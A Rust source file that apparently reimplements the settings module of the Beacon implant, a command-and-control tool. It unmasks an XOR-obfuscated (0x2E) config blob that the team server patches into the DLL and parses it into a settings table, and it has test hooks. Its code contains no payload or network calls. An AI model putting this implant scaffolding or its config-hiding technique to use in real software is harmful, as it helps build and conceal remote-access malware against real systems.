//! API to retrieve and set Beacon settings (settings.cpp).
//!
//! In the original build the team server patches `myargs` (a 4096-byte
//! config blob, XOR-obfuscated with 0x2E) directly into the DLL image.
//! `settings_init` unmasks it, parses the settings table, then zeroes it.
//!
//! The settings table is process-lifetime configuration: it is populated
//! once (DLL_PROCESS_ATTACH) and read afterwards, so it lives in a
//! `OnceLock`. The C++ string settings (`char*`) are modelled as owned
//! `Vec<u8>` values; `setting_ptr` returns a `'static` slice into the
//! lock-owned table.

use crate::parse::DataP;
use std::sync::OnceLock;

pub const TYPE_NONE: u16 = 0;
pub const TYPE_SHORT: u16 = 1;
pub const TYPE_INT: u16 = 2;
pub const TYPE_PTR: u16 = 3;

/// PATCH_SIZE = sizeof(arguments)
pub const PATCH_SIZE: usize = 4096;
const MAX_SETTINGS: usize = 128;

#[derive(Clone)]
pub enum SettingValue {
    None,
    Short(u16),
    Int(u32),
    Ptr(Vec<u8>),
}

#[derive(Clone)]
pub struct Setting {
    pub stype: u16,
    pub value: SettingValue,
}

impl Default for Setting {
    fn default() -> Self {
        Setting {
            stype: TYPE_NONE,
            value: SettingValue::None,
        }
    }
}

pub struct SettingsTable {
    pub entries: [Setting; MAX_SETTINGS],
}

impl Default for SettingsTable {
    fn default() -> Self {
        SettingsTable {
            entries: std::array::from_fn(|_| Setting::default()),
        }
    }
}

static SETTINGS: OnceLock<SettingsTable> = OnceLock::new();
static BEACON_PTR: OnceLock<usize> = OnceLock::new();

fn table() -> &'static SettingsTable {
    SETTINGS.get_or_init(SettingsTable::default)
}

/// Seed the `myargs` blob (used by tests / tooling). The real build patches
/// the DLL image directly.
pub fn seed_myargs(blob: &[u8]) {
    crate::settings_util::set_myargs(blob);
}

/// Read a setting entry by id.
pub fn setting_get(field: usize) -> &'static Setting {
    if field >= MAX_SETTINGS {
        static NONE: Setting = Setting {
            stype: TYPE_NONE,
            value: SettingValue::None,
        };
        return &NONE;
    }
    &table().entries[field]
}

pub fn setting_short(field: usize) -> u16 {
    let value = setting_get(field);
    if value.stype == TYPE_SHORT {
        if let SettingValue::Short(s) = &value.value {
            return *s;
        }
    }
    0
}

pub fn setting_int(field: usize) -> u32 {
    let value = setting_get(field);
    if value.stype == TYPE_INT {
        if let SettingValue::Int(i) = &value.value {
            return *i;
        }
    }
    0
}

/// Test whether a flag is set in a SHORT setting.
pub fn setting_option(field: usize, value: u16) -> bool {
    let flags = setting_short(field);
    (flags & value) == value
}

pub fn get_beacon_ptr() -> usize {
    *BEACON_PTR.get().unwrap_or(&0)
}

pub fn setting_ptr(field: usize) -> Option<&'static [u8]> {
    let value = setting_get(field);
    if value.stype == TYPE_PTR {
        if let SettingValue::Ptr(p) = &value.value {
            return Some(p.as_slice());
        }
    }
    None
}

pub fn setting_len(field: usize) -> usize {
    setting_ptr(field).map(|p| p.len()).unwrap_or(0)
}

/// Parse the patched `myargs` blob into the settings table.
pub fn settings_init(bptr: usize) {
    if SETTINGS.get().is_some() {
        return;
    }
    let _ = BEACON_PTR.set(bptr);

    let mut myargs = crate::settings_util::take_myargs();
    // unmask myargs
    for x in 0..myargs.len() {
        myargs[x] ^= 0x2E;
    }

    let mut table = SettingsTable::default();
    {
        let mut parser = DataP::init(&mut myargs[..]);
        // walk myargs and populate settings[id]
        loop {
            let index = parser.data_short();
            if index <= 0 {
                break;
            }
            let stype = parser.data_short();
            let length = parser.data_short();

            if (index as usize) >= MAX_SETTINGS {
                break;
            }
            let entry = &mut table.entries[index as usize];
            entry.stype = stype;
            match stype {
                TYPE_SHORT => {
                    entry.value = SettingValue::Short(parser.data_short());
                }
                TYPE_INT => {
                    entry.value = SettingValue::Int(parser.data_int());
                }
                TYPE_PTR => {
                    if let Some(data) = parser.data_ptr(length as usize) {
                        entry.value = SettingValue::Ptr(data.to_vec());
                    }
                }
                _ => {}
            }
        }
    }

    let _ = SETTINGS.set(table);
}

/// Test-only: force re-init from a fresh blob (resets the table).
#[cfg(test)]
pub fn settings_init_for_test(bptr: usize) {
    crate::settings_util::reset_for_test();
    settings_init(bptr);
}
